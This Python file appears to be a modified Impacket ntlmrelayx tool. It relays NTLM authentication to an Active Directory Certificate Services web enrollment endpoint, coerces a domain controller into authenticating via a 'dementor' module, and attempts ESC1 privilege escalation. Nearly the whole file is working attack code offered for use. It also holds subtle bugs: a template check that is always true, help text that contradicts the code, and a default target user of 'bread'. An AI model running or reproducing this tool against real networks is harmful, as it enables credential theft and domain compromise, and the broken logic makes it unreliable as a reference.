#!/usr/bin/env python
# SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Generic NTLM Relay Module
#
# Authors:
#  Alberto Solino (@agsolino)
#  Dirk-jan Mollema / Fox-IT (https://www.fox-it.com)
#
# Description:
#             This module performs the SMB Relay attacks originally discovered
# by cDc extended to many target protocols (SMB, MSSQL, LDAP, etc).
# It receives a list of targets and for every connection received it
# will choose the next target and try to relay the credentials. Also, if
# specified, it will first to try authenticate against the client connecting
# to us.
#
# It is implemented by invoking a SMB and HTTP Server, hooking to a few
# functions and then using the specific protocol clients (e.g. SMB, LDAP).
# It is supposed to be working on any LM Compatibility level. The only way
# to stop this attack is to enforce on the server SPN checks and or signing.
#
# If the authentication against the targets succeeds, the client authentication
# succeeds as well and a valid connection is set against the local smbserver.
# It's up to the user to set up the local smbserver functionality. One option
# is to set up shares with whatever files you want to so the victim thinks it's
# connected to a valid SMB server. All that is done through the smb.conf file or
# programmatically.
#

import argparse
import sys
import logging
import cmd
try:
    from urllib.request import ProxyHandler, build_opener, Request
except ImportError:
    from urllib2 import ProxyHandler, build_opener, Request

import json
from threading import Thread

from impacket import version
from impacket.examples import logger
from smbrelayserver import SMBRelayServer
from config import NTLMRelayxConfig
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor, TargetsFileWatcher
import cert_recon_test
from httpattack import HTTPAttack
import dementor
from httprelayclient import HTTPRelayClient


RELAY_SERVERS = []

class MiniShell(cmd.Cmd):
    def __init__(self, relayConfig, threads):
        cmd.Cmd.__init__(self)

        self.prompt = 'ntlmrelayx> '
        self.tid = None
        self.relayConfig = relayConfig
        self.intro = 'Type help for list of commands'
        self.relayThreads = threads
        self.serversRunning = True

    @staticmethod
    def printTable(items, header):
        colLen = []
        for i, col in enumerate(header):
            rowMaxLen = max([len(row[i]) for row in items])
            colLen.append(max(rowMaxLen, len(col)))

        outputFormat = ' '.join(['{%d:%ds} ' % (num, width) for num, width in enumerate(colLen)])

        # Print header
        print(outputFormat.format(*header))
        print('  '.join(['-' * itemLen for itemLen in colLen]))

        # And now the rows
        for row in items:
            print(outputFormat.format(*row))

    def emptyline(self):
        pass

    def do_targets(self, line):
        for url in self.relayConfig.target.originalTargets:
            print(url.geturl())
        return

    def do_finished_attacks(self, line):
        for url in self.relayConfig.target.finishedAttacks:
            print (url.geturl())
        return

    def do_socks(self, line):
        headers = ["Protocol", "Target", "Username", "AdminStatus", "Port"]
        url = "http://localhost:9090/ntlmrelayx/api/v1.0/relays"
        try:
            proxy_handler = ProxyHandler({})
            opener = build_opener(proxy_handler)
            response = Request(url)
            r = opener.open(response)
            result = r.read()
            items = json.loads(result)
        except Exception as e:
            logging.error("ERROR: %s" % str(e))
        else:
            if len(items) > 0:
                self.printTable(items, header=headers)
            else:
                logging.info('No Relays Available!')

    def do_startservers(self, line):
        if not self.serversRunning:
            start_servers(options, self.relayThreads)
            self.serversRunning = True
            logging.info('Relay servers started')
        else:
            logging.error('Relay servers are already running!')

    def do_stopservers(self, line):
        if self.serversRunning:
            stop_servers(self.relayThreads)
            self.serversRunning = False
            logging.info('Relay servers stopped')
        else:
            logging.error('Relay servers are already stopped!')

    def do_exit(self, line):
        print("Shutting down, please wait!")
        return True

    def do_EOF(self, line):
        return self.do_exit(line)

def start_servers(options, threads):
    for server in RELAY_SERVERS:
        #setup config
        c = NTLMRelayxConfig()
        c.setProtocolClients(PROTOCOL_CLIENTS)

        c.setTargets(targetSystem)
        c.setAttacks(PROTOCOL_ATTACKS)
        c.setMode(mode)
        c.setInterfaceIP(options.interface_ip)
        c.setSMB2Support(options.smb2support)

        c.setIsADCSAttack(options.adcs)
        c.setIsDementorAttack(options.dementor)
        c.setADCSOptions(options.template)
        c.setADCSUser(options.user)
        c.setADCSPass(options.password)
        c.setADCSDomain(options.domain)
        c.setADCSListener(options.listener)
        c.setADCSTargetDC(options.targetDC)
        c.setADCSNTLMHash(options.NTLMHash)
        c.setEscalation(options.escalate)
        c.setTargetUser(options.target_user)


        #if server is HTTPRelayServer:
        #    c.setListeningPort(options.http_port)
        #    c.setDomainAccount(options.machine_account, options.machine_hashes, options.domain)
        #elif server is SMBRelayServer:

        if server is SMBRelayServer:
            c.setListeningPort(options.smb_port)
            s = server(c)
            s.start()
            threads.add(s)

    return c

def stop_servers(threads):
    todelete = []
    for thread in threads:
        if isinstance(thread, tuple(RELAY_SERVERS)):
            thread.server.shutdown()
            todelete.append(thread)
    # Now remove threads from the set
    for thread in todelete:
        threads.remove(thread)
        del thread

# Process command-line arguments.
if __name__ == '__main__':

    print(version.BANNER)
    #Parse arguments
    parser = argparse.ArgumentParser(add_help = False, description = "This module will perform certificate Authoirty and "
                                                                     "Certificate Template Reconssaince using LDAP. "
                                                                     "This tool is based off the research provided to us by specterops. "
                                    "")
    parser._optionals.title = "Main options"

    #Main arguments
    parser.add_argument("-h","--help", action="help", help='show this help message and exit')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-t',"--target", action='store', metavar = 'TARGET', help="Target CA Web Enrollment service to relay creds to for (ESC8), "
                                  "The format should be -t http://192.168.100.5/certsrv/certfnsh.asp -- based on https://www.exandroid.dev/2021/06/23/ad-cs-relay-attack-practical-guide/")

    serversoptions = parser.add_argument_group()


    parser.add_argument('--smb-port', type=int, help='Port to listen on smb server', default=445)
    parser.add_argument('-ip', '--interface-ip', action='store', metavar='INTERFACE_IP',
                        help='IP address of interface to '
                             'bind SMB and HTTP servers', default='')

    parser.add_argument('-r', action='store', metavar = 'SMBSERVER', help='Redirect HTTP requests to a file:// path on SMBSERVER')
    parser.add_argument('-ra', '--random', action='store_true', help='Randomize target selection')
    parser.add_argument('-smb2support', action="store_true", default=False, help='SMB2 Support')
    #parser.add_argument('-of', '--output-file', action='store',
    #                    help='base output filename for encrypted hashes. Suffixes '
    #                         'will be added for ntlm and ntlmv2')
    #ADCS options
    adcsoptions = parser.add_argument_group("AD CS Attack Options")
    adcsoptions.add_argument('--adcs', action='store_true', required=False, help='Enalbe AD CS relay attack')
    adcsoptions.add_argument('--template',action='store',metavar="TEMPLATE",required=False,default="Machine",help='AD CS template. If you are attacking Domain Controller or other windows server machine, default value should be suitable.')
    adcsoptions.add_argument('--user',type=str,action='store',required=False, help='domain user to coerce DC into authenticating to our relay server with')
    adcsoptions.add_argument('--password',type=str,action='store',required=False, help='password of domain user to coerce DC into authenticating to our relay server with')
    adcsoptions.add_argument('--domain',type=str,action='store',required=False, help='Target domain that user & DC belongs to')
    adcsoptions.add_argument('--listener',type=str,action='store',required=False, help='IP address that faces the domain network')
    adcsoptions.add_argument('--targetDC',type=str,action='store',required=False, help='IP address of the target domain controller')
    adcsoptions.add_argument('--NTLMHash',type=str,action='store',required=False,default="", help='NTLM hash of the user we are using to coerce the DC into authenticating to our relay server with')
    adcsoptions.add_argument('--dementor',action='store_true', required=False, help='if dementor flag is used, then the script will automatically run dementor with the options specified above; else you need to run dementor or PrintSpooler separately')
    adcsoptions.add_argument('-tu','--target_user',type=str,action='store',required=False,default="bread",help='Target User that we will overwrite certificate subject name with default is Administrator.')
    adcsoptions.add_argument('-e','--escalate',action='store_true',required=False,help="Will Attempt privesc using ESC1 Path. User can provoide Certificate Subject Name.")


    try:
       options = parser.parse_args()
       #print(options.user)
    except Exception as e:
       logging.error(str(e))
       sys.exit(1)

    # Init the example's logger theme
    logger.init(options.ts)
    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)
        logging.getLogger('impacket.smbserver').setLevel(logging.ERROR)

    # Let's register the protocol clients we have
    # ToDo: Do this better somehow
    from impacket.examples.ntlmrelayx.clients import PROTOCOL_CLIENTS
    from impacket.examples.ntlmrelayx.attacks import PROTOCOL_ATTACKS


    if options.target is not None:
        logging.info("Running in relay mode to single host")
        mode = 'RELAY'
        targetSystem = TargetsProcessor(singleTarget=options.target, protocolClients=PROTOCOL_CLIENTS, randomize=options.random)

    RELAY_SERVERS.append(SMBRelayServer)

    threads = set()

    config = start_servers(options, threads)

    print("")
    logging.info("Servers started, waiting for connections")

    vulnerable_certs = cert_recon_test.main(options.targetDC, options.user, options.password, 'ldap', options.domain)
    for cert in vulnerable_certs:
        if "ESC1 DOMAIN USERS" in cert.escalations or "ESC1 CURRENT USER" in cert.escalations or "ESC1 DOMAIN USERS & CURRENT USER":
            config.setTargetCertName(cert.name)
            #httpattack.adcs_subject_supply_name_attack()
            break

    if options.dementor:
        dem = dementor.Dementor(options.domain, options.user, options.password, options.NTLMHash, options.targetDC, options.listener)
        dem.main()

    try:
        sys.stdin.read()
    except KeyboardInterrupt:
        pass
    else:
        pass
    for s in threads:
        del s

    sys.exit(0)
